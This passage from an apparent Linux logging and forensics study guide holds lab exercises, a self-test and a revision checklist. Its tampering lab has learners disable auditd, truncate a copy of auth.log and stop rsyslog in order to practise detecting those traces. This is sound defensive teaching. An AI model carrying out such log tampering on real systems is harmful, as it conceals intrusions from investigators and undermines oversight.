4. Run `id`; `ausearch -k exec -i | tail`.
5. Disable audit with `auditctl -e 0`; find the `CONFIG_CHANGE` record; re-enable.

### 20.4 Tampering (1 hour)

1. Truncate a copy of `auth.log`; compare `last` output.
2. `journalctl --verify`; note output.
3. Stop rsyslog; generate logs; restart; observe the gap.
4. `chattr +a` on a test file; try to delete as root; observe.

### 20.5 Detection (2 hours)

Write three queries in your SIEM (or `grep`):

1. SSH failures > 20 per IP per 10 min.
2. Successful SSH login following > 5 failures for the same user.
3. New user added to `sudo` group outside business hours.

Document expected false positives for each.

### 20.6 Forwarding (1 hour)

1. Set up a second VM as rsyslog server.
2. Forward auth logs over TLS (or plain TCP in the lab).
3. Generate an event; confirm it arrives.
4. Kill the network; confirm queuing; restore; confirm delivery.

---

## 21. Self-test

1. Name the four logging pillars and what each answers.
2. Which file holds auth events on Debian? On RHEL?
3. What is the difference between `syslog` and `journalctl`?
4. Why can missing `auditd` be a bigger problem than missing syslog?
5. What does `auid=1000 uid=0` tell you?
6. What does `auid=4294967295` suggest?
7. Which command lists failed logins, and which file does it read?
8. Why is `wtmp` useful if `auth.log` was deleted?
9. What are the signs of auditd tampering?
10. How do you make journald persistent?
11. What does `chattr +a` do, and what is its limitation?
12. How do you verify log integrity in journald?
13. What fields in a web access log suggest SQL injection?
14. Name three persistence locations to check.
15. How do you forward audit logs to a SIEM?
16. Why is clock sync critical for investigations?
17. What two things should you do before deleting or rotating logs during an incident?
18. What is `HISTTIMEFORMAT` for?
19. Which command shows current network connections with processes?
20. What is the risk of `execve` auditing on a busy host?

---

## 22. Revision checklist

- [ ] Four pillars: syslog, journald, auditd, kernel.
- [ ] Path table: `auth.log`/`secure`, `syslog`/`messages`, `audit.log`, `wtmp`/`btmp`.
- [ ] syslog format, facilities, severities.
- [ ] journald storage modes and `journalctl` flags.
- [ ] sshd line types: Accepted, Failed, Invalid, preauth.
- [ ] sudo/su/useradd log shapes.
- [ ] auditd rules + `ausearch`/`aureport` + record fields (`auid`, `ses`, `EXECVE`).
- [ ] Kernel messages worth alerting on.
- [ ] Web/cron/container log signals.
- [ ] `last`, `lastb`, `lastlog`, `who`.
- [ ] logrotate directives and retention.
- [ ] Forwarding: rsyslog TLS, journald, audisp-remote, agents.
- [ ] Tampering techniques and detection.
- [ ] Five detection scenarios with queries.
- [ ] Investigation workflow and evidence order.
- [ ] Triage table memorised.
- [ ] Cheat sheet commands.
- [ ] Hardening baseline.
- [ ] Lab done at least once end to end.
